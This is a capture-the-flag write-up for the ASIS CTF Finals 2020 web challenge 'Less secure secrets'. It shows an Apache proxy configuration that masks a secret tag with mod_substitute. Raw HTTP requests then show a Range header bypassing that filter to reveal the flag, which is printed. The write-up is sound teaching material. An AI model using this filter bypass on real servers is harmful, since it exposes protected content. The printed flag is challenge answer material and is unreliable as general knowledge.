# ASIS CTF Finals 2020 – Less secure secrets

* **Category:** web
* **Points:** 71

## Challenge

> Let's warm up!
> 
> https://securesecrets.asisctf.com/

## Solution

The website shows a page like the following.

```html
<html>
    <head>
        <title>Secret protector</title>        
        <link href="https://fonts.googleapis.com/css2?family=Chilanka&display=swap" rel="stylesheet">
        <style>
            body{
                background-color: #262428;
            }
            .title-protection{
                font-family: "Chilanka";
                font-size: 40px;
                font-weight: bold;
                color: white;
                width: 100%;
                text-align: center;
                height: 400px;
                line-height: 400px;
            }
            iframe{
                width: 400px;
                height: 300px;
                margin-top: -50px;
            }
            .frame-holder{
                text-align: center;
                width: 100%;
            }
        </style>
    </head>
    <body>
        <div>
            <div class="title-protection">
                Apache powered secret protection. Secure your secrets, with our sample <a href="configs.zip">configs</a>.
            </div>
            <div class="frame-holder">
                <iframe src="/secret.html">
                </iframe>
            </div>
            <div>
                
            </div>
        </div>
    </body>
</html>
```

You can discover the [configs.zip](configs.zip) file with configurations.

Analyzing [`configs/config/proxy/apache_ctf.conf`](configs/config/proxy/apache_ctf.conf) file, you can find a rule that substitute a `secret` tag.

```
ServerName proxy

LoadModule deflate_module /usr/local/apache2/modules/mod_deflate.so
LoadModule proxy_module /usr/local/apache2/modules/mod_proxy.so
LoadModule substitute_module /usr/local/apache2/modules/mod_substitute.so
LoadModule proxy_http_module /usr/local/apache2/modules/mod_proxy_http.so

<VirtualHost *:80>
    RequestHeader unset Accept-Encoding
    ProxyPass / http://main/
    ProxyPassReverse / http://main/

    SetEnvIf X-Http-Method-Override ".+" X-Http-Method-Override=$0
    RequestHeader set X-Http-Method-Override %{X-Http-Method-Override}e env=X-Http-Method-Override

    SetEnvIf Range ".+" Range=$0
    RequestHeader set Range %{Range}e env=Range

    SetEnvIf Via ".+" Via=$0
    RequestHeader set Via %{Via}e env=Via

    SetEnvIf If-Match ".+" If-Match=$0
    RequestHeader set If-Match %{If-Match}e env=If-Match

    <if "%{REMOTE_ADDR} != '127.0.0.1'">
        AddOutputFilterByType INFLATE;SUBSTITUTE;DEFLATE text/html
        Substitute s|<secret>(.*)</secret>|Protected|i
    </if>
    
    # Send apache logs to stdout and stderr
    CustomLog /proc/self/fd/1 common
    ErrorLog /proc/self/fd/2
</VirtualHost>
```

So if you try to read `secret.html` page you will obtain the content with the substitution applied.

```
GET /secret.html HTTP/1.1
Host: securesecrets.asisctf.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: https://securesecrets.asisctf.com/
Connection: close


HTTP/1.1 200 OK
date: Fri, 11 Dec 2020 23:23:18 GMT
server: Apache/2.4.46 (Unix)
last-modified: Fri, 11 Dec 2020 14:56:25 GMT
etag: "36b-5b6317f19aaf3"
accept-ranges: bytes
content-type: text/html
vary: Accept-Encoding
connection: close
Content-Length: 792

<html>
    <head>
        <title>very secure key</title>        
        <link href="https://fonts.googleapis.com/css2?family=Chilanka&display=swap" rel="stylesheet">
        <style>
            body{
                background-color:	#2e2e2e;
            }
            .title-protection{
                font-family: "Chilanka";
                font-size: 20px;
                font-weight: bold;
                color: white;
                width: 100%;
                padding: 40px 100px;
                box-sizing: border-box;
                text-align: center;
                height: 400px;
            }
        </style>
    </head>
    <body>
        <div>
            <div class="title-protection">
                Protected
            </div>
        </div>
    </body>
</html>
```

You can use the `Range` HTTP header to exfiltrate the original `secret.html` page.

```
GET /secret.html HTTP/1.1
Host: securesecrets.asisctf.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: https://securesecrets.asisctf.com/
Connection: close
Range: bytes=0-1023


HTTP/1.1 206 Partial Content
date: Fri, 11 Dec 2020 23:25:00 GMT
server: Apache/2.4.46 (Unix)
last-modified: Fri, 11 Dec 2020 14:56:25 GMT
etag: "36b-5b6317f19aaf3"
accept-ranges: bytes
content-length: 875
content-range: bytes 0-874/875
content-type: text/html
connection: close

<html>
    <head>
        <title>very secure key</title>        
        <link href="https://fonts.googleapis.com/css2?family=Chilanka&display=swap" rel="stylesheet">
        <style>
            body{
                background-color:	#2e2e2e;
            }
            .title-protection{
                font-family: "Chilanka";
                font-size: 20px;
                font-weight: bold;
                color: white;
                width: 100%;
                padding: 40px 100px;
                box-sizing: border-box;
                text-align: center;
                height: 400px;
            }
        </style>
    </head>
    <body>
        <div>
            <div class="title-protection">
                <secret>What??? You want the first secret? I think it's "ASIS{L3T5_S74rT_7h3_fUn}".</secret>
            </div>
        </div>
    </body>
</html>
```

The flag is the following.

```
ASIS{L3T5_S74rT_7h3_fUn}
```